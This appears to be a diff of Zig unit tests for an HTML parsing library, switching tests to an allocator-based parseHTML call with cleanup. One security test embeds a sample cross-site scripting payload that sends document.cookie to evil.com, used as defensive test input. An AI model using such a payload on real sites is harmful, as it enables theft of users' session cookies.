@@ -392,7 +392,9 @@ pub fn matchesTagName(element: *z.HTMLElement, tag_name: []const u8) bool {
 }
 
 test "matchesTagName" {
-    const doc = try z.createDocFromString("<p></p><br>");
+    const allocator = testing.allocator;
+    const doc = try z.parseHTML(allocator, "<p></p><br>");
+    defer z.destroyDocument(doc);
     const body_elt = z.bodyElement(doc).?;
     const p = z.firstElementChild(body_elt).?;
     const br = z.nextElementSibling(p).?;
@@ -416,7 +418,7 @@ pub const WhitespacePreserveTagSet = struct {
 test "whitespacepreservedTagSet" {
     const allocator = testing.allocator;
 
-    const doc = try z.createDocFromString("<div></div><pre></pre><code></code><textarea></textarea><script></script><style></style><p></p>");
+    const doc = try z.parseHTML(allocator, "<div></div><pre></pre><code></code><textarea></textarea><script></script><style></style><p></p>");
     defer z.destroyDocument(doc);
 
     const body_elt = z.bodyElement(doc).?;
@@ -509,8 +511,9 @@ fn isNoEscapeElement(element: *z.HTMLElement) bool {
 }
 
 test "custom elements security validation" {
+    const allocator = testing.allocator;
     const user_submitted_html = "<custom-widget><script>document.location = 'https://evil.com?data=' + document.cookie;</script></custom-widget>";
-    const doc = try z.createDocFromString(user_submitted_html);
+    const doc = try z.parseHTML(allocator, user_submitted_html);
     defer z.destroyDocument(doc);
 
     const body_elt = z.bodyElement(doc).?;
